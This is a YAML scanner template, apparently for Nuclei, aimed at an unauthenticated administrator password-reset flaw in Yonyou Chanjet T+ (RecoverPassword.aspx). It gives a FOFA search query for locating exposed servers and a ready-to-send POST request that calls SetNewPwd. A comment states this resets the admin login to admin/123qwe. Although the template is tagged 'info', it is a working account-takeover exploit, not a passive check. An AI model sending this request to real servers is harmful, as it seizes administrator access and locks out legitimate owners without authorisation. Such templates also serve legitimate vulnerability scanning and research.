id: RecoverPassword_aspx
info:
  name: 用友 畅捷通T+ RecoverPassword.aspx
  author: mike
  severity: info
  description: 用友 畅捷通T+ RecoverPassword.aspx 存在未授权管理员密码修改漏洞，攻击者可以通过漏洞修改管理员账号密码登录后台
  reference: https://www.cnblogs.com/pursue-security/p/17684749.html
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="畅捷通-TPlus"
http:
  - raw:
      - |
        POST /tplus/ajaxpro/RecoverPassword,App_Web_recoverpassword.aspx.cdcab7d2.ashx?method=SetNewPwd
        Host: {{Hostname}}  
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
        Accept-Encoding: gzip, deflate

        {"pwdNew":"46f94c8de14fb36680850768ff1b7f2a"}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "true"
# 验证POC, 重置账号密码为 admin/123qwe